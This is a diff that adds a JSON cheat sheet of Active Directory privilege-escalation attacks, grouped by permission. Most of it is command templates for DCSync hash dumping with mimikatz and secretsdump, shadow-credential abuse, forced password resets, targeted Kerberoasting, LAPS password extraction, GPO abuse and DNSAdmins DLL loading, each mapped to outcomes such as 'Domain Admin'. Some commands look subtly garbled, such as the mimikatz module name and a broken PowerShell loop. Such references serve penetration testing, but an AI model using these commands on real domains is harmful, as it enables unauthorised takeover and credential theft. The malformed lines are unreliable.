@@ -1,0 +1,120 @@
+{
+  "Permissions_Move": {
+    "DCSync": {
+      "description": "#Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts",
+      "commands": [
+        "mimikatz !dadump::dcsync /domain:<target_domain> /user:<target_domain>\\administrator",
+        "secretsdump '<domain>/'<user>':<password>@'<domain_controller>'"
+      ],
+      "results": ["Domain Admin", "Lateral move", "Crack Hash"]
+    },
+    "Shadow_Credentials": {
+      "requirements": "can change msDS-KeyCredentialLink (Generic Write) + ADCS",
+      "commands": {
+        "Whisker": {
+          "commands": [
+            "certipy shadow auto -u <user>@<domain> -p <password> -account '<target_account>'",
+            "pywhisker.py -d 'FQDN_DOMAIN' -u 'test' -p 'CERTIFICATE_PASSWORD' --target 'TARGET_SAMNAME' --action 'list'",
+            "pywhisker.py"
+          ],
+          "result": "Pass the Certificate"
+        }
+      }
+    },
+    "On_Group": {
+      "permissions": [
+        "Self (Self-Membership) on Group",
+        "GenericAll/WriteProperty on Group",
+        "WriteProperty (Self-Membership)",
+        "WriteOwner on Group"
+      ],
+      "actions": {
+        "Add_group_member": {
+          "commands": [
+            "net group '<group>' <myuser> /add /domain",
+            "ldeep ldap -u <user> -p <pwd> -d <domain> -s ldap://<dc> add_to_group 'CN=<user>,DC=<domain>' 'CN=<group>,DC=<domain>'"
+          ],
+          "result": "ACL"
+        },
+        "WriteOwner_Tools": {
+          "commands": [
+            "owneredit.py",
+            "dacledit.py"
+          ]
+        }
+      }
+    },
+    "On_Computer": {
+      "permissions": "GenericAll / GenericWrite",
+      "actions": {
+        "msDS-AllowedToActOnBehalf": "RBCD",
+        "add_Key_Credentials": "shadow credentials"
+      }
+    },
+    "On_User": {
+      "GenericAll_GenericWrite": {
+        "actions": {
+          "change_password": {
+            "command": "net user <user> <password> /domain",
+            "result": "User with clear text pass"
+          },
+          "add_SPN": {
+            "command": "targetedKerberoast.py -d <domain> -u <user> -p <pass>",
+            "result": "hash found (TGS)"
+          },
+          "add_Key_Credentials": "shadow credentials",
+          "logon_script": "Access"
+        }
+      },
+      "ForceChangePassword": {
+        "commands": [
+          "net user <user> <password> /domain",
+          "net rpc password <user> <password> -S <dc_fqdn>"
+        ],
+        "result": "User with clear text pass"
+      }
+    },
+    "ACLs_ACEs_permissions": {
+      "tools": [
+        "aclpwn.py",
+        "adtoolkit <domain>/<user>:<password>@<target> get-objectacl [-all|-object <object>]"
+      ]
+    },
+    "LAPS_Enumeration": {
+      "who_can_read": "MATCH p=({Group})-[:ReadLAPSPassword]->(c:Computer) RETURN p",
+      "get_laps_passwords": {
+        "commands": [
+          "Get-LAPSPasswords -DomainController <ip dc> -Credential <domain>\\<login> | Format-Table -AutoSize",
+          "foreach ($objResult in $colResults){$ objComputer = $objResult.Properties; $ objComputer.name;where {$objcomputer.name -ne $env:computername)}%(foreach-object {Get-AdmPwdPassword -ComputerName $ }})",
+          "cme ldap <dc ip> -d <domain> -u <user> -p < password> --module laps",
+          "use post/windows/gather/credentials/enum_laps"
+        ],
+        "result": "admin"
+      }
+    },
+    "GPO": {
+      "queries": [
+        "MATCH (gr:Group), (gp:GPO), p=((gr)-[:GenericWrite]->(gp)) RETURN p",
+        {
+          "SID_principals": "Get-DomainObjectAcl -SearchBase 'CN=Policies, DC=lab,DC=local' -ResolveGUIDs | ? { $_.ObjectAceType -eq 'Group-Policy-Container' } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl"
+        },
+        {
+          "GP_Link": "Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq 'GP-Link' -and $_ActiveDirectoryRights -match 'WriteProperty' } | select ObjectDN, SecurityIdentifier | fl"
+        }
+      ],
+      "Generic_Write": {
+        "action": "Abuse GPO",
+        "result": "Access"
+      }
+    },
+    "DNSadmins_abuse": {
+      "cve": "CVE-2021-40469",
+      "commands": [
+        "dnscmd.exe /config /serverlevelplugindll <\\\\path\\dll> # need a dnsadmin user",
+        "sc \\\\DNSServer stop dns",
+        "sc \\\\DNSServer start dns"
+      ],
+      "result": "Admin"
+    }
+  }
+}
